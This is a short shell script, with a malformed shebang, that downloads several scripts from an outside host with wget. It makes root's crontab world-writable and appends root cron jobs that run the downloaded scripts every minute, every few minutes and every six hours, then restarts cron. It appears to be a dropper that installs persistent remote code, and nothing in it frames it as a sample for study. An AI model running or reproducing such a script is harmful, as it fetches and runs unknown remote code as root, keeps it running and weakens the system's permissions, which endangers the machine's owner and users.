#/bin/sh
cd /home/
mkdir api
chmod -R 777 /home/api/
cd /home/api/
wget http://yangyusheng.top/download/api2.sh
wget http://yangyusheng.top/download/cleancache.sh
wget http://yangyusheng.top/download/redis.sh
wget http://yangyusheng.top/download/config.txt
chmod -R 777 /home/api/
chmod -R 777 /var/spool/cron/crontabs/root
echo "*/1 * * * * /bin/sh /home/api/api2.sh" >> /var/spool/cron/crontabs/root
echo "*/3 * * * * /bin/sh /home/api/redis.sh" >> /var/spool/cron/crontabs/root
echo "0 */6 * * * /bin/sh /home/api/cleancache.sh" >> /var/spool/cron/crontabs/root
/etc/init.d/cron stop
/etc/init.d/cron start
exit 0